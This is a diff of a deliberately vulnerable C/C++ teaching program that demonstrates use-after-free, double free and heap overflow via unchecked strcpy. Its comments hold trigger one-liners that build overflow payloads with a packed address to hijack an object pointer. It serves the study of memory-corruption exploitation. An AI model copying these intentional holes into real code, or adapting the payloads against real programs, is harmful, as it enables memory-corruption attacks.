@@ -59,8 +59,8 @@ void example3() {
   delete b;
 
   Derived* d = new Derived(0x41414141);
-  print_base(b /* note */);
-  delete d;
+
+  print_base(b); // use after free
 }
 
 // Double free
@@ -84,7 +84,7 @@ void example5(char** argv) {
   print_base(b);
 
   // copy into buffer
-  strcpy(buf, argv[1]);
+  strcpy(buf, argv[2]);
 
   // print class
   print_base(b);
@@ -98,7 +98,7 @@ void example6(char** argv) {
 
   // Allocate buffer and copy string into buffer
   char* buf = (char*) malloc(8);
-  strcpy(buf, argv[1]);
+  strcpy(buf, argv[2]);
 
   // print class
   print_base(b);
@@ -107,14 +107,15 @@ void example6(char** argv) {
 
 
 int main(int argc, char**argv) {
-  // example1();
-  // example2();
-  // example3();
-  // example4();
-  // example5(argv);
-  // TRIGGER: ./example2  $(python2 -c "print 'AAAAAAAABBBBCCCC\x68\x80\x0f\x08IIII'")
-  example6(argv);
-
-  // TRIGGER: ./example2  $(python2 -c "print '\x68\x80\x0f\x08AAAA'")
+  switch (strtol(argv[1], NULL, 10)) {
+    case 1: example1(); return 0;
+    case 2: example2(); return 0;
+    case 3: example3(); return 0;
+    case 4: example4(); return 0;
+    case 5: example5(argv); return 0;
+  // TRIGGER: ./example2 5 $(perl -e 'print ("A"x16);print pack("I!",0x80f9068);print("BBBB")')
+    case 6: example6(argv); return 0;
+  // TRIGGER: ./example2 6 $(perl -e 'print pack("I!",0x80f9068);print("BBBB")')
+  }
   return 0;
 }
